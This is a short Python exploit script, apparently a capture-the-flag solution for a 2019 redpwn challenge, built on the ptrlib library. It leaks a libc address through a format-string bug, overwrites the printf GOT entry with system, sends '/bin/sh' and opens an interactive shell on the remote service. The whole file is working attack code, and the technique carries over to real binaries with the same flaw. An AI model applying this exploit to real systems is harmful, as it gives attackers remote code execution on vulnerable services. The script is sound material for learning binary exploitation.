from ptrlib import *

libc = ELF("./libc-2.23.so")
sock = Socket("chall2.2019.redpwn.net", 4007)

got_printf = 0x804a010
got_fgets  = 0x804a014
got_setbuf = 0x804a00c

# leak libc
payload = p32(got_printf) + b"%7$s"
sock.sendline(payload)
libc_base = u32(sock.recv()[4:8]) - libc.symbol("printf")
logger.info("libc = " + hex(libc_base))

# get shell
writes = {
    got_printf: libc_base + libc.symbol("system")
}
payload = fsb(
    writes = writes,
    bs = 1,
    pos = 7,
    bits = 32
)
sock.sendline(payload)
print(sock.recv())
sock.sendline("/bin/sh")

sock.interactive()
